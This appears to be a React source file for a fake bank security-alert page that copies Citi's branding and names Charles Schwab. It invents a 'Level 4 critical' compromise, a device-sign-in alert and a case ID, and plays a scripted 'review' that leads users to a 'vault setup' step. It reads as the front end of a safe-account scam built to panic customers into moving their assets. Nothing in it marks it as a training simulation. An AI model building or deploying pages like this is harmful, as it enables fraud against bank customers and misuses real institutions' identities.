            <text x="4" y="54" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="56" fill="#fff" letterSpacing="-1">citi</text>
            <path d="M78 10 Q90 2 102 10" stroke="#E31837" strokeWidth="6" fill="none" strokeLinecap="round"/>
          </svg>
          <div style={{ width: 1, height: 16, background: 'rgba(255,255,255,0.22)' }} />
          <span style={{ fontSize: 11.5, color: 'rgba(255,255,255,0.8)', fontWeight: 600 }}>Security Center</span>
        </div>
        <div style={{ fontSize: 10, fontWeight: 700, background: '#B91C1C', color: '#fff', padding: '3px 10px', borderRadius: 3, letterSpacing: '0.1em' }}>
          LEVEL 4, CRITICAL
        </div>
      </div>

      <div style={{ padding: '26px 28px' }}>
        <h1 style={{ fontSize: 19, fontWeight: 700, color: '#111827', marginBottom: 7, lineHeight: 1.25 }}>
          A compromised device has accessed your account
        </h1>
        <p style={{ fontSize: 13, color: '#6B7280', lineHeight: 1.75, marginBottom: 22 }}>
          Our fraud detection system flagged a sign-in from an unrecognized device and location. Your credentials may be at risk.
        </p>

        <div style={{ border: '1px solid #E5E7EB', borderRadius: 4, marginBottom: 18, overflow: 'hidden' }}>
          <div style={{ background: '#F9FAFB', borderBottom: '1px solid #E5E7EB', padding: '8px 16px', display: 'flex', alignItems: 'center', gap: 8 }}>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none"><rect x="5" y="2" width="14" height="20" rx="2" stroke="#374151" strokeWidth="2"/><circle cx="12" cy="18" r="1" fill="#374151"/></svg>
            <span style={{ fontSize: 10, fontWeight: 700, color: '#374151', letterSpacing: '0.1em', textTransform: 'uppercase' }}>Unauthorized Sign-in Details</span>
          </div>
          <DeviceGrid alertTime={alertTime} attemptedPhone={attemptedPhone} />
        </div>

        <AssetsAtRisk />

        <div style={{ border: '1px solid #E5E7EB', borderRadius: 4, padding: '11px 16px', marginBottom: 22, display: 'flex', alignItems: 'center', gap: 16, flexWrap: 'wrap' }}>
          <div>
            <div style={{ fontSize: 9, fontWeight: 700, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 4 }}>Threat Level</div>
            <div style={{ display: 'flex', gap: 3 }}>
              {[1,2,3,4,5].map(n => <div key={n} style={{ width: 24, height: 5, borderRadius: 2, background: n <= 4 ? (n <= 2 ? '#003087' : n === 3 ? '#92400E' : '#B91C1C') : '#E5E7EB' }} />)}
            </div>
          </div>
          <div style={{ width: 1, height: 28, background: '#E5E7EB' }} />
          <div>
            <div style={{ fontSize: 9, fontWeight: 700, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 2 }}>Status</div>
            <div style={{ fontSize: 11.5, fontWeight: 700, color: '#B91C1C' }}>Account Flagged for Review</div>
          </div>
          <div style={{ width: 1, height: 28, background: '#E5E7EB' }} />
          <div>
            <div style={{ fontSize: 9, fontWeight: 700, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 2 }}>Case ID</div>
            <div style={{ fontSize: 11.5, fontWeight: 600, color: '#374151', fontFamily: 'monospace' }}>{caseId}</div>
          </div>
        </div>

        {state === 'prompt' && <RecognitionPrompt onYes={onYes} onNo={onNo} accent="#003087" accentHover="#0041B8" />}
        {(state === 'reviewing' || state === 'complete') && <SecurityReviewFlow phase={state === 'reviewing' ? 'reviewing' : 'complete'} isCiti={true} onProceedToModal={onProceedToModal} />}
      </div>
    </div>
  );
}

// ── Page ─────────────────────────────────────────────────────────────────────

export default function SecurityAlertPage() {
  const [, navigate] = useLocation();
  const isCiti = localStorage.getItem('finvault_active_theme') === 'citi';
  const caseIdKey = isCiti ? 'finvault_case_id_citi' : 'finvault_case_id_schwab';
  const caseId = localStorage.getItem(caseIdKey) || (isCiti ? 'SEC-D4891F' : 'SEC-C1002D');
  const alertTime = getAlertTime();
  const attemptedPhone = genAttemptedPhone(caseId);

  type PageState = 'prompt' | 'reviewing' | 'complete' | 'modal';
  const [pageState, setPageState] = useState<PageState>('prompt');

  const handleYes = () => { navigate('/security-alert'); };
  const handleNo  = () => { setPageState('reviewing'); };

  useEffect(() => {
    if (pageState === 'reviewing') {
      // Phase 1: 4s contacting unit, then show full solution brief
      const t = setTimeout(() => setPageState('complete'), 4000);
      return () => clearTimeout(t);
    }
    // 'complete' stays until the user reads + clicks the button — no auto-advance
    return undefined;
  }, [pageState]);

  const handleProceedToModal = () => setPageState('modal');

  // Map page state to the card's display state
  const cardState: 'prompt' | 'reviewing' | 'complete' =
    pageState === 'modal' ? 'complete' : pageState as 'prompt' | 'reviewing' | 'complete';

  const cardProps = {
    caseId, alertTime, attemptedPhone,
    state: cardState,
    onYes: handleYes,
    onNo: handleNo,
    onProceedToModal: handleProceedToModal,
  };

  return (
    <>
      <style>{GLOBAL_STYLES}</style>
      <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', fontFamily: '"Helvetica Neue", Arial, sans-serif', background: isCiti ? '#F5F7FA' : '#F0F2F5' }}>
        {isCiti ? <HeaderCiti loggedIn /> : <HeaderLoggedIn />}

        <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '40px 24px' }}>
          <div style={{ width: '100%', maxWidth: 580 }}>

            {/* Level badge */}
            <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 20 }}>
              <svg width="17" height="17" viewBox="0 0 24 24" fill="none">
                <path d="M12 9v4m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"
                  stroke="#B91C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
              <div>
                <div style={{ fontSize: 10, fontWeight: 700, letterSpacing: '0.12em', color: '#B91C1C', textTransform: 'uppercase' }}>
                  LEVEL 4 SECURITY RISK, CRITICAL
                </div>
                <div style={{ fontSize: 11, color: '#6B7280', marginTop: 1 }}>
                  Immediate action required on your {isCiti ? 'Citi' : 'Charles Schwab'} account
                </div>
              </div>
            </div>

            {isCiti ? <CitiCard {...cardProps} /> : <SchwabCard {...cardProps} />}

            <p style={{ fontSize: 11, color: '#9CA3AF', textAlign: 'center', marginTop: 16, lineHeight: 1.6 }}>
              {isCiti ? 'Citi' : 'Charles Schwab'} will never ask for your full password by phone or email.{' '}
              <span style={{ color: isCiti ? '#003087' : '#344B58', fontWeight: 600, cursor: 'pointer' }}>Learn about account security</span>
            </p>
          </div>
        </div>

        <SiteFooter />
      </div>

      {/* Vault modal — rendered outside main flow to sit above everything */}
      {pageState === 'modal' && (
        <VaultModal isCiti={isCiti} onProceed={() => navigate('/vault-setup')} />
      )}
    </>
  );
}
